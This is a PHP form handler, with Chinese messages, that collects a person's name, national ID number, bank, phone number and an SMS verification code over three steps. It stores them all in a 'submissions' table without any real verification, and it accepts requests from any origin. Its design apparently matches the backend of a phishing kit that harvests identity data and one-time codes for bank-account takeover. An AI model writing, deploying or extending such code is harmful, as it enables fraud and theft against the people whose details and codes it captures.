<?php
session_start();
require 'db.php';

header('Content-Type: application/json');
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

try {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $step = $_POST['step'] ?? 0;

        switch($step) {
            case 1: // 实名认证
                $required = ['name', 'idcard'];
                foreach($required as $field) {
                    if(empty($_POST[$field])) {
                        throw new Exception("字段 $field 不能为空");
                    }
                }

                $_SESSION['form_data'] = [
                    'name' => htmlspecialchars($_POST['name']),
                    'id_card' => htmlspecialchars($_POST['idcard'])
                ];

                echo json_encode(['status' => 'success', 'step' => 2]);
                break;

            case 2: // 银行卡验证
                $required = ['bank', 'phone'];
                foreach($required as $field) {
                    if(empty($_POST[$field])) {
                        throw new Exception("字段 $field 不能为空");
                    }
                }

                $_SESSION['form_data'] = array_merge(
                    $_SESSION['form_data'],
                    [
                        'bank_name' => htmlspecialchars($_POST['bank']),
                        'phone' => htmlspecialchars($_POST['phone'])
                    ]
                );

                echo json_encode(['status' => 'success', 'step' => 3]);
                break;

            case 3: // 验证码
                if(empty($_POST['code'])) {
                    throw new Exception("验证码不能为空");
                }

                $data = array_merge(
                    $_SESSION['form_data'],
                    ['verification_code' => htmlspecialchars($_POST['code'])]
                );

                $stmt = $pdo->prepare("INSERT INTO submissions 
                    (name, id_card, bank_name, phone, verification_code)
                    VALUES (:name, :id_card, :bank_name, :phone, :code)");

                $stmt->execute([
                    ':name' => $data['name'],
                    ':id_card' => $data['id_card'],
                    ':bank_name' => $data['bank_name'],
                    ':phone' => $data['phone'],
                    ':code' => $data['verification_code']
                ]);

                unset($_SESSION['form_data']);
                echo json_encode(['status' => 'success']);
                break;

            default:
                throw new Exception("无效的请求");
        }
    }
} catch (Exception $e) {
    http_response_code(400);
    echo json_encode([
        'status' => 'error',
        'message' => $e->getMessage()
    ]);
}
?>